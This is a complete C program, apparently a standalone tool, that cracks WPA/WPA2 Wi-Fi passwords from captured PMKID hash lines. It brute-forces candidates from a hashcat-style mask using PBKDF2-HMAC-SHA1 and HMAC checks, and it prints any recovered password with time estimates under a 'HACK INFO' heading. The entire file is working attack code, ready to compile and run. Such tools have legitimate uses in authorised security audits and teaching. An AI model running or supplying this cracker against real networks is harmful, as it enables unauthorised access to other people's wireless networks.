#define _POSIX_C_SOURCE 200809L
#include <errno.h>
#include <math.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>

#define MAX_PASSWORD 63

typedef struct {
    unsigned char pmkid[16];
    unsigned char message[20];
    unsigned char ssid[32];
    size_t ssid_len;
} Network;

typedef struct {
    const char *chars[MAX_PASSWORD];
    size_t counts[MAX_PASSWORD];
    size_t indices[MAX_PASSWORD];
    char literals[MAX_PASSWORD][2];
    char password[MAX_PASSWORD + 1];
    size_t length;
    double total;
} Mask;

static int hex_digit(unsigned char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static bool decode_hex(const char *text, unsigned char *out, size_t count) {
    if (strlen(text) != count * 2) return false;
    for (size_t i = 0; i < count; ++i) {
        int high = hex_digit((unsigned char)text[i * 2]);
        int low = hex_digit((unsigned char)text[i * 2 + 1]);
        if (high < 0 || low < 0) return false;
        out[i] = (unsigned char)((high << 4) | low);
    }
    return true;
}

static bool parse_network(char *line, Network *network) {
    char *fields[6];
    char *cursor = line;
    for (size_t i = 0; i < 6; ++i) {
        fields[i] = cursor;
        char *end = strchr(cursor, '*');
        if (!end) return false;
        *end = '\0';
        cursor = end + 1;
    }
    if (strcmp(fields[0], "WPA") || strcmp(fields[1], "01")) return false;
    size_t hex_len = strlen(fields[5]);
    if (hex_len % 2 || hex_len > 64) return false;
    network->ssid_len = hex_len / 2;
    memcpy(network->message, "PMK Name", 8);
    return decode_hex(fields[2], network->pmkid, 16)
        && decode_hex(fields[3], network->message + 8, 6)
        && decode_hex(fields[4], network->message + 14, 6)
        && decode_hex(fields[5], network->ssid, network->ssid_len);
}

static bool parse_mask(const char *text, Mask *mask) {
    static const char upper[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    static const char lower[] = "abcdefghijklmnopqrstuvwxyz";
    static const char digits[] = "0123456789";
    static const char symbols[] = "!@#$%^&*()-_=+[]{};:'\",.<>/?\\|`~";
    static const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static const char all[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?\\|`~";
    memset(mask, 0, sizeof(*mask));
    mask->total = 1;
    for (size_t i = 0; text[i]; ++i) {
        size_t p = mask->length;
        if (p == MAX_PASSWORD) return false;
        const char *chars;
        if (text[i] == '?') {
            switch (text[++i]) {
                case 'u': chars = upper; break;
                case 'l': chars = lower; break;
                case 'd': chars = digits; break;
                case 's': chars = symbols; break;
                case 'c': chars = letters; break;
                case 'a': chars = all; break;
                default: return false;
            }
        } else {
            mask->literals[p][0] = text[i];
            chars = mask->literals[p];
        }
        mask->chars[p] = chars;
        mask->counts[p] = strlen(chars);
        mask->password[p] = chars[0];
        mask->total *= (double)mask->counts[p];
        ++mask->length;
    }
    return mask->length > 0 && isfinite(mask->total);
}

static bool next_password(Mask *mask) {
    for (size_t p = mask->length; p > 0;) {
        --p;
        if (++mask->indices[p] < mask->counts[p]) {
            mask->password[p] = mask->chars[p][mask->indices[p]];
            return true;
        }
        mask->indices[p] = 0;
        mask->password[p] = mask->chars[p][0];
    }
    return false;
}

/* Return -1 on a crypto error, 0 on mismatch, or 1 on match. */
static int check_password(const Network *network, const Mask *mask) {
    unsigned char pmk[32], digest[EVP_MAX_MD_SIZE];
    unsigned int digest_len = 0;
    if (!PKCS5_PBKDF2_HMAC_SHA1(mask->password, (int)mask->length,
            network->ssid, (int)network->ssid_len, 4096, sizeof(pmk), pmk))
        return -1;
    if (!HMAC(EVP_sha1(), pmk, sizeof(pmk), network->message,
            sizeof(network->message), digest, &digest_len) || digest_len < 16)
        return -1;
    return memcmp(digest, network->pmkid, 16) == 0;
}

static double seconds_now(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        perror("clock_gettime");
        exit(EXIT_FAILURE);
    }
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <path to pmkid file> <guess mask>\n", argv[0]);
        return EXIT_FAILURE;
    }
    Mask mask;
    if (!parse_mask(argv[2], &mask)) {
        fprintf(stderr, "Invalid mask: use 1–63 characters and ?u ?l ?d ?s ?a ?c.\n");
        return EXIT_FAILURE;
    }
    FILE *file = fopen(argv[1], "r");
    if (!file) {
        fprintf(stderr, "File could not be opened: %s: %s\n", argv[1], strerror(errno));
        return EXIT_FAILURE;
    }
    printf("\n[INPUT INFO]\nPMKID File: %s\nGuess Mask: %s\n", argv[1], argv[2]);
    char *line = NULL;
    size_t capacity = 0;
    int status = EXIT_SUCCESS;
    while (getline(&line, &capacity, file) != -1) {
        line[strcspn(line, "\r\n")] = '\0';
        printf("\n\n------NEW NETWORK------\n\n[NETWORK INFO]\nHandshake: %s\n", line);
        Network network;
        if (!parse_network(line, &network)) {
            fprintf(stderr, "Wrong line format (expected WPA*01 PMKID record).\n");
            status = EXIT_FAILURE;
            continue;
        }
        printf("SSID: ");
        fwrite(network.ssid, 1, network.ssid_len, stdout);
        printf("\n\n[HACK INFO]\n");
        /* Reinitialize candidate positions for each network. */
        parse_mask(argv[2], &mask);
        double start = seconds_now();
        unsigned int initial_attempts = 0;
        bool cracked = false;
        do {
            int match = check_password(&network, &mask);
            if (match < 0) {
                fprintf(stderr, "OpenSSL password derivation or HMAC failed.\n");
                status = EXIT_FAILURE;
                break;
            }
            if (match) {
                printf("Match found with password: %s\n", mask.password);
                cracked = true;
                break;
            }
            if (initial_attempts < 3 && ++initial_attempts == 3)
                printf("Estimated total time: %.2f seconds\n",
                    (seconds_now() - start) * mask.total / 3);
        } while (next_password(&mask));
        if (!cracked) printf("Password could not be found.\n");
        printf("Total time taken: %.2f seconds\n", seconds_now() - start);
    }
    if (ferror(file)) {
        fprintf(stderr, "Error reading PMKID file.\n");
        status = EXIT_FAILURE;
    }
    free(line);
    fclose(file);
    return status;
}
